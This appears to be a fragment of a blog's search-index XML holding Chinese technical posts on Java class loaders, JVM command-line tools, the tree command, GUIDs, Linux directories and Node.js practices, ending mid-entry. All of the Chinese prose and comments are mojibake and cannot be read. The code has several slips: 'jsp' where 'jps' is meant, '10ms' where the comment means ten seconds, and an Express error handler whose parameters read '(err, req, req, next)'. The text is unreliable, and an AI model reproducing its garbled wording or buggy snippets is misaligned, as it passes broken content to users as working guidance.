class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è‡ªå®šä¹‰ç±»åŠ è½½å™¨ä¸€èˆ¬ç»§æ‰¿äº &#123;<span class="doctag">@link</span> java.lang.ClassLoader&#125;ã€‚&lt;br&gt;</span></span><br><span class="line"><span class="comment"> * ç”¨æˆ·éœ€è¦å®ç°&#123;<span class="doctag">@link</span> #findClass(String)&#125;æ–¹æ³•åŠ è½½classæ–‡ä»¶ï¼Œ</span></span><br><span class="line"><span class="comment"> * ç„¶åè°ƒç”¨&#123;<span class="doctag">@link</span> #defineClass(String, byte[], int, int)&#125;å°†ç±»æ–‡ä»¶ï¼ˆè¡¨ç¤ºä¸ºå­—èŠ‚æ•°æ®ï¼‰è½¬æ¢æˆç±»å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecureClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String classpath;</span><br><span class="line">    <span class="keyword">private</span> String privateKey;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classpath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> secret RSAç§é’¥</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SecureClassLoader</span><span class="params">(String classpath, String secret)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classpath = classpath;</span><br><span class="line">        <span class="built_in">this</span>.privateKey = secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> loadSecureClass(name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Class&lt;?&gt; loadSecureClass(String name) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] className = name.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        className[className.length - <span class="number">1</span>] += <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] classData = Files.readAllBytes(Paths.get(classpath, className));</span><br><span class="line">        <span class="comment">// è§£å¯†æ•°æ®</span></span><br><span class="line">        <span class="comment">// classData = RSA.decrypt(classData, privateKey);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> defineClass(name, classData, <span class="number">0</span>, classData.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">SecureClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureClassLoader</span>(args[<span class="number">0</span>], args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; personClass = classLoader.loadClass(<span class="string">&quot;cc.kekek.java.Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€ å®ä¾‹</span></span><br><span class="line">        Constructor&lt;?&gt; personConstructor = personClass.getConstructor(String.class, Byte.TYPE);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ming</span> <span class="operator">=</span> personConstructor.newInstance(<span class="string">&quot;å°æ˜&quot;</span>, (<span class="type">byte</span>) <span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;ming = &quot;</span> + ming);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;one year later...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åå°„æ–¹å¼</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">setAge</span> <span class="operator">=</span> personClass.getMethod(<span class="string">&quot;setAge&quot;</span>, Byte.TYPE);</span><br><span class="line">        setAge.invoke(ming, (<span class="type">byte</span>) <span class="number">11</span>);</span><br><span class="line">        <span class="comment">// æ–¹æ³•å¥æŸ„æ–¹å¼</span></span><br><span class="line">        <span class="type">MethodType</span> <span class="variable">methodType</span> <span class="operator">=</span> MethodType.methodType(Void.TYPE, String.class);</span><br><span class="line">        <span class="type">MethodHandle</span> <span class="variable">handle</span> <span class="operator">=</span> MethodHandles.lookup().findVirtual(personClass, <span class="string">&quot;setName&quot;</span>, methodType);</span><br><span class="line">        handle.invoke(ming, <span class="string">&quot;ming&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;ming = &quot;</span> + ming);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤è¡Œå·¥å…·"><a href="#å‘½ä»¤è¡Œå·¥å…·" class="headerlink" title="å‘½ä»¤è¡Œå·¥å…·"></a>å‘½ä»¤è¡Œå·¥å…·</h3><ul><li><p>javac</p><p>  java ç¼–è¯‘å‘½ä»¤ï¼Œå°†javaæºæ–‡ä»¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼ˆ.classï¼‰æ–‡ä»¶ã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac cc/kekek/demo/Hello.java</span><br></pre></td></tr></table></figure><ul><li><p>-classpath</p><p>  æä¾›ç¼–è¯‘æ—¶éœ€è¦ï¼ˆä¾èµ–ï¼‰çš„ç±»ã€‚</p></li><li><p>-d some&#x2F;dir</p><p>  å‘Šè¯‰ javac æŠŠç¼–è¯‘å¾—åˆ°çš„ç±»æ–‡ä»¶æ”¾åœ¨å“ªå„¿ã€‚</p></li><li><p>-source <version></p><p> è®¾å®š javac èƒ½æ¥å—çš„ Java ç‰ˆæœ¬ã€‚</p></li><li><p>-target <version></p><p> è®¾å®š javac ç¼–è¯‘å¾—åˆ°çš„ç±»æ–‡ä»¶ç‰ˆæœ¬ã€‚</p></li></ul></li><li><p>java </p><p>  java æ˜¯å¯åŠ¨ Java è™šæ‹Ÿæœºçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç¨‹åºçš„é¦–ä¸ªå…¥å£ç‚¹æ˜¯æŒ‡å®šç±»ä¸­çš„ main() æ–¹æ³•ã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java &lt;options&gt; cc.kekek.demo.Hello &lt;args&gt;</span><br><span class="line">java -jar my-packaged.jar</span><br><span class="line">java -cp my-packaged.jar cc.kekek.demo.Hello &lt;args&gt;</span><br></pre></td></tr></table></figure><ul><li><p>-cp <classpath></p><p>  å®šä¹‰ä»å“ªä¸ªè·¯å¾„è¯»å–ç±»ã€‚é»˜è®¤é…ç½®çš„<code>CLASSPATH</code>ç¯å¢ƒå˜é‡ï¼Œè¿™ä¸ªç¯å¢ƒå˜é‡çš„ä¸€èˆ¬ä»¥<code>.</code>å¼€å¤´ï¼Œä»£è¡¨å½“å‰ç›®å½•ã€‚</p></li><li><p>-D&lt;property&#x3D;value&gt;</p><p>  è®¾å®š Java ç³»ç»Ÿå±æ€§ï¼Œåœ¨ Java ç¨‹åºä¸­èƒ½å–å›<code>System.getProperty(&quot;property&quot;)</code>è®¾å®šçš„å±æ€§ã€‚ä½¿ç”¨è¿™ç§æ–¹å¼å¯ä»¥è®¾å®šä»»æ„ä¸ªå±æ€§ã€‚</p></li></ul></li><li><p>jar </p><p>  å®ç”¨å·¥å…· jar ç”¨äºå¤„ç† Java æ¡£æ¡ˆï¼ˆ.jarï¼‰æ–‡ä»¶ã€‚è¿™æ˜¯ ZIP æ ¼å¼çš„æ–‡ä»¶ï¼ŒåŒ…å« Java ç±»ã€é™„åŠ çš„èµ„æºå’Œå…ƒæ•°æ®ï¼ˆé€šå¸¸ä¼šæœ‰ï¼‰ã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvf my.jar someDir/</span><br></pre></td></tr></table></figure><ul><li><p>e</p><p>  æŠŠ JAR æ–‡ä»¶å˜æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œä¸”ä½¿ç”¨æŒ‡å®šçš„ç±»ä½œä¸ºå…¥å£ç‚¹ã€‚</p></li></ul></li><li><p>jps</p><p>  æ˜¾ç¤ºæ‰€æœ‰çš„jvmè¿›ç¨‹ã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹è¿œç¨‹æœºå™¨</span><br><span class="line">jsp &lt;ip&gt;</span><br></pre></td></tr></table></figure></li><li><p>jstat</p><p>  æŸ¥çœ‹çš„é€šå¸¸æ˜¯æœ¬åœ°è¿›ç¨‹ï¼Œä¸è¿‡ï¼Œå¦‚æœè¿œç¨‹è®¾å¤‡ä¸­è¿è¡Œç€åˆé€‚çš„ jstatd è¿›ç¨‹ï¼Œä¹Ÿèƒ½æŸ¥çœ‹è¿™å°è¿œç¨‹è®¾å¤‡ä¸­çš„è¿›ç¨‹ã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æ¯10sæ‰“å°ä¸€ä¸‹åƒåœ¾å›æ”¶ä¿¡æ¯</span><br><span class="line">jstat -gcutil &lt;vmid&gt; 10ms</span><br></pre></td></tr></table></figure></li><li><p>jstatd</p><p>  jstatd èƒ½è®©æœ¬åœ° JVM çš„ä¿¡æ¯é€šè¿‡ç½‘ç»œä¼ å‡ºå»ã€‚æƒ³ä¼ é€’ä¿¡æ¯ï¼Œéœ€è¦ç‰¹æ®Šçš„å®‰å…¨è®¾ç½®ï¼Œè¿™å’Œ JVM çš„é»˜è®¤è®¾ç½®æœ‰æ‰€ä¸åŒã€‚å¯åŠ¨ jstatd ä¹‹å‰è¦å…ˆåˆ›å»ºä¸‹è¿°æ–‡ä»¶ï¼Œå¹¶å°†å…¶å‘½åä¸º jstatd.policyã€‚</p><blockquote><p><code>Could not contact registry</code>é”™è¯¯ã€‚ä¸€èˆ¬æ‰€åœ¨ç¯å¢ƒDNSæœ‰é—®é¢˜ï¼Œä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„æŒ‡å‘ã€‚ä¸€èˆ¬ç”¨æˆ·éœ€è¦æŸ¥çœ‹<code>hostname</code>ï¼Œç„¶åé…ç½®<code>/etc/hosts</code>é…ç½®IPã€‚</p></blockquote>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant codebase &quot;file:$&#123;java.home&#125;/../lib/tools.jar&quot; &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jstatd -J-Djava.security.policy=&lt;path to jstat.policy&gt; </span><br></pre></td></tr></table></figure><ul><li>-p <port></li></ul></li><li><p>jstack <process id></p><p>  jstack å®ç”¨å·¥å…·ç”¨äºè¾“å‡ºè¿›ç¨‹ä¸­æ¯ä¸ª Java çº¿ç¨‹çš„å †æ ˆè·Ÿè¸ªã€‚</p></li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li>æ·±å…¥ç†è§£Javaè™šæ‹Ÿæœº</li><li>JavaæŠ€æœ¯æ‰‹å†Œ</li><li>åƒåœ¾å›æ”¶çš„ç®—æ³•ä¸å®ç°</li><li><a href="https://blog.csdn.net/yangzl2008/article/details/43202969">Javaä¸­çš„é€ƒé€¸åˆ†æå’ŒTLABä»¥åŠJavaå¯¹è±¡åˆ†é…</a></li><li><a href="https://www.ziwenxie.site/2017/07/24/java-jvm-gc/">JVMåƒåœ¾å›æ”¶ç®—æ³•åŠå›æ”¶å™¨è¯¦è§£</a></li><li><a href="http://www.infoq.com/cn/news/2017/03/garbage-collection-algorithm">ç†è§£åƒåœ¾å›æ”¶ç®—æ³•</a></li><li><a href="https://www.jianshu.com/p/cd85098cca39">JVMæºç åˆ†æä¹‹çº¿ç¨‹å±€éƒ¨ç¼“å­˜TLAB</a></li><li><a href="http://ifeve.com/useful-jvm-flags-part-7-cms-collector/">JVMå®ç”¨å‚æ•°ï¼ˆä¸ƒï¼‰CMSæ”¶é›†å™¨</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tree</title>
      <link href="/post/tree.html"/>
      <url>/post/tree.html</url>
      
        <content type="html"><![CDATA[<h3 id="Tree"><a href="#Tree" class="headerlink" title="Tree"></a>Tree</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree -I &#x27;node_modules|docs|logs&#x27; -L 2</span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š    </p><ul><li>-I å¿½ç•¥æ–‡ä»¶å¤¹</li><li>-P åŒ¹é…æ–‡ä»¶å¤¹</li><li>-L æ·±åº¦</li><li>-h æ–‡ä»¶å¤§å°</li><li>-s æ–‡ä»¶å­—èŠ‚å¤§å°</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GUID</title>
      <link href="/post/GUID.html"/>
      <url>/post/GUID.html</url>
      
        <content type="html"><![CDATA[<h3 id="å…¨å±€å”¯ä¸€ID"><a href="#å…¨å±€å”¯ä¸€ID" class="headerlink" title="å…¨å±€å”¯ä¸€ID"></a>å…¨å±€å”¯ä¸€ID</h3><ol><li>uuid</li><li>objectid</li><li>redis + incr</li><li>twitter snowflake</li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.jianshu.com/p/61817cf48cc3">ã€1ã€‘</a>  <a href="http://cenalulu.github.io/mysql/guid-generate/">ã€2ã€‘</a> <a href="http://calvin1978.blogcn.com/articles/uuid.html">ã€3ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> guid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxç³»ç»Ÿç›®å½•</title>
      <link href="/post/linux-system-directory.html"/>
      <url>/post/linux-system-directory.html</url>
      
        <content type="html"><![CDATA[<h3 id="Linuxç›®å½•æ ‘"><a href="#Linuxç›®å½•æ ‘" class="headerlink" title="Linuxç›®å½•æ ‘"></a>Linuxç›®å½•æ ‘</h3><p>æ–‡ä»¶ç³»ç»Ÿå±‚æ¬¡ç»“æ„æ ‡å‡†ï¼ˆè‹±è¯­ï¼šFilesystem Hierarchy Standardï¼ŒFHSï¼‰å®šä¹‰äº†Linuxæ“ä½œç³»ç»Ÿä¸­çš„ä¸»è¦ç›®å½•åŠç›®å½•å†…å®¹ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¼ ç»ŸBSDæ–‡ä»¶ç³»ç»Ÿå±‚æ¬¡ç»“æ„çš„å½¢å¼åŒ–ä¸æ‰©å……ã€‚  </p><p><a href="http://naotu.baidu.com/file/e1901e0ff8626dab7aa0a0030c49a443?token=f36657e586143cc9">ç™¾åº¦è„‘å›¾</a></p><p><img src="/images/linux-directory-tree.png"></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.ruanyifeng.com/blog/2012/02/a_history_of_unix_directory_structure.html">ã€1ã€‘</a> <a href="http://www.jb51.net/article/15800.htm">ã€2ã€‘</a> <a href="http://linux.vbird.org/linux_basic/0210filepermission.php">ã€3ã€‘</a> <a href="http://www.runoob.com/linux/linux-system-contents.html">ã€4ã€‘</a> <a href="http://yangrong.blog.51cto.com/6945369/1288072">ã€5ã€‘</a> <a href="http://h2appy.blog.51cto.com/609721/781281/">ã€6ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.jsæœ€ä½³å®è·µ</title>
      <link href="/post/nodejs-best-practice.html"/>
      <url>/post/nodejs-best-practice.html</url>
      
        <content type="html"><![CDATA[<h3 id="Node-jsæœ€ä½³å®è·µ"><a href="#Node-jsæœ€ä½³å®è·µ" class="headerlink" title="Node.jsæœ€ä½³å®è·µ"></a>Node.jsæœ€ä½³å®è·µ</h3><h4 id="ä½¿ç”¨å…¨å±€å˜é‡"><a href="#ä½¿ç”¨å…¨å±€å˜é‡" class="headerlink" title="ä½¿ç”¨å…¨å±€å˜é‡"></a>ä½¿ç”¨å…¨å±€å˜é‡</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">CONSTANTS</span> = constants;</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">E</span> = E;</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">PID</span> = process.<span class="property">pid</span>;</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">WORKSPACE</span> = __dirname;</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">TEMP</span> = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;.temp&#x27;</span>);</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">APP_ID</span> = uuid.<span class="title function_">v4</span>();</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">NOOP</span> = _.<span class="property">noop</span>;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -r global test.js</span><br></pre></td></tr></table></figure><h4 id="å…¨å±€ä¸´æ—¶ç›®å½•-temp-WORKSPACE"><a href="#å…¨å±€ä¸´æ—¶ç›®å½•-temp-WORKSPACE" class="headerlink" title="å…¨å±€ä¸´æ—¶ç›®å½•.temp &amp; WORKSPACE"></a>å…¨å±€ä¸´æ—¶ç›®å½•<code>.temp</code> &amp; <code>WORKSPACE</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mkdirp = <span class="built_in">require</span>(<span class="string">&#x27;mkdirp&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// init</span></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mkdirp.<span class="title function_">sync</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;.temp&#x27;</span>));</span><br><span class="line">    mkdirp.<span class="title function_">sync</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;logs&#x27;</span>));</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h4 id="äºŒçº§ç¼“å­˜"><a href="#äºŒçº§ç¼“å­˜" class="headerlink" title="äºŒçº§ç¼“å­˜"></a>äºŒçº§ç¼“å­˜</h4><p>lru-cache + redis</p><h4 id="co-catch-next-promise-catch-next"><a href="#co-catch-next-promise-catch-next" class="headerlink" title="co-catch-next | promise.catch-next"></a>co-catch-next | promise.catch-next</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">co</span>(<span class="keyword">function</span>* () &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;).<span class="title function_">catch</span>(next);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Q.<span class="title function_">fcall</span>(promisedStep1)</span><br><span class="line">.<span class="title function_">then</span>(promisedStep2)</span><br><span class="line">.<span class="title function_">then</span>(promisedStep3)</span><br><span class="line">.<span class="title function_">then</span>(promisedStep4)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function">(<span class="params">value4</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Do something with value4</span></span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(next);</span><br></pre></td></tr></table></figure><h4 id="å¼‚å¸¸å¤„ç†-catch-next-uncaughtException-domain"><a href="#å¼‚å¸¸å¤„ç†-catch-next-uncaughtException-domain" class="headerlink" title="å¼‚å¸¸å¤„ç† catch-next &amp; uncaughtException &amp; domain"></a>å¼‚å¸¸å¤„ç† catch-next &amp; <code>uncaughtException</code> &amp; <code>domain</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, req, next</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">res.<span class="title function_">send</span>(<span class="string">&#x27;HTTP-Internal Server Error&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">db.<span class="title function_">stop</span>(<span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> domain = <span class="built_in">require</span>(<span class="string">&#x27;domain&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">handler</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">domainMiddleware</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> reqDomain = domain.<span class="title function_">create</span>();</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            reqDomain.<span class="title function_">dispose</span>();</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        reqDomain.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> handler === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">                <span class="title function_">handler</span>(err, req, res, next);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">next</span>(err);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        reqDomain.<span class="title function_">run</span>(next);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="é€€å‡ºç¨‹åº"><a href="#é€€å‡ºç¨‹åº" class="headerlink" title="é€€å‡ºç¨‹åº"></a>é€€å‡ºç¨‹åº</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;SIGINT&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">db.<span class="title function_">stop</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        process.<span class="title function_">exit</span>(err ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="pm2-ymlé…ç½®"><a href="#pm2-ymlé…ç½®" class="headerlink" title="pm2.ymlé…ç½®"></a><code>pm2.yml</code>é…ç½®</h4><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pm2.yml</span></span><br><span class="line"><span class="attr">apps:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">script   :</span> <span class="string">&#x27;./app.js&#x27;</span></span><br><span class="line">      <span class="attr">name     :</span> <span class="string">&#x27;app&#x27;</span></span><br><span class="line">      <span class="attr">exec_mode:</span> <span class="string">&#x27;cluster&#x27;</span></span><br><span class="line">      <span class="attr">instances:</span> <span class="string">&#x27;max&#x27;</span></span><br><span class="line">      <span class="attr">watch    :</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">env :</span></span><br><span class="line">          <span class="attr">NODE_ENV:</span> <span class="string">local</span></span><br><span class="line">      <span class="attr">env_vps:</span></span><br><span class="line">          <span class="attr">NODE_ENV:</span> <span class="string">vps</span></span><br><span class="line">      <span class="attr">env_production:</span></span><br><span class="line">          <span class="attr">NODE_ENV:</span> <span class="string">production</span></span><br><span class="line">      <span class="attr">log_date_format:</span> <span class="string">&#x27;YYYY-MM-DD HH:mm:ss Z&#x27;</span></span><br><span class="line">      <span class="attr">combine_logs:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">merge_logs:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">error_file:</span> <span class="string">&#x27;./logs/pm2_app_err.log&#x27;</span></span><br><span class="line">      <span class="attr">out_file:</span> <span class="string">&#x27;./logs/pm2_app_out.log&#x27;</span></span><br><span class="line">      <span class="attr">autorestart:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">force:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pm2 start pm2.yml --env production</span></span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.infoq.com/cn/articles/quit-scheme-of-node-uncaughtexception-emergence">ã€1ã€‘</a> <a href="https://fengmk2.com/blog/2012/12/domain_module.html">ã€2ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nohup</title>
      <link href="/post/nohup.html"/>
      <url>/post/nohup.html</url>
      
